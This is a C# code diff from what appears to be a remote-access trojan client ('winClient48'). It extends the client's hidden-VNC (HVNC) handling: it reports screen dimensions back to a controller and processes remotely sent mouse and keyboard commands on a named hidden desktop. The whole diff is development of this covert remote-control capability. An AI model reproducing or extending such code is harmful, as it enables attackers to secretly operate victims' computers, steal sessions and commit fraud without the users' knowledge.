@@ -2992,12 +2992,20 @@ namespace winClient48
                             foreach (var session in m_lsHVNC)
                                 ls2d.Add(new List<string>() { session.m_szDesktopName, session.m_bRunning ? "True" : "False" });
 
+                            var screen = Screen.AllScreens.First();
+                            var bounds = screen.Bounds;
+                            int nLeft = bounds.Left;
+                            int nTop = bounds.Top;
+                            int nWidth = bounds.Width;
+                            int nHeight = bounds.Height;
+
                             v.fnSendCommand(new string[]
                             {
                                 "hvnc",
                                 "window",
                                 "init",
                                 clsEZData.fn2dListToString(ls2d),
+                                $"{nLeft},{nTop},{nWidth},{nHeight}",
                             });
                         }
                         else if (cmd[2] == "sc")
@@ -3148,24 +3156,20 @@ namespace winClient48
                     }
                     else if (cmd[1] == "mouse")
                     {
-                        string szName = cmd[2];
+                        string szName = cmd[2]; // Desktop name
                         string action = cmd[3]; // "MOVE", "LD", "LU", etc.
                         int x = int.Parse(cmd[4]);
                         int y = int.Parse(cmd[5]);
                         int delta = int.Parse(cmd[6]); // "SC"
 
-                        try
+                        var hvnc = fnGetHVNC(szName);
+                        if (hvnc == null)
                         {
-                            var hvnc = fnGetHVNC(szName);
-                            if (hvnc == null)
-                                return;
-
-                            hvnc.fnHandleMouseInput(action, x, y);
+                            MessageBox.Show("NULL");
+                            return;
                         }
-                        catch (Exception ex)
-                        {
 
-                        }
+                        hvnc.fnHandleMouseInput(action, x, y);
                     }
                     else if (cmd[1] == "keyboard")
                     {
@@ -3173,18 +3177,14 @@ namespace winClient48
                         string action = cmd[3];
                         int vk = int.Parse(cmd[4]);
 
-                        try
+                        var hvnc = fnGetHVNC(szName);
+                        if (hvnc == null)
                         {
-                            var hvnc = fnGetHVNC(szName);
-                            if (hvnc == null)
-                                return;
-
-                            hvnc.fnHandleKeyboardInput(action, vk);
+                            MessageBox.Show("NULL");
+                            return;
                         }
-                        catch (Exception ex)
-                        {
 
-                        }
+                        hvnc.fnHandleKeyboardInput(action, vk);
                     }
                 }
 
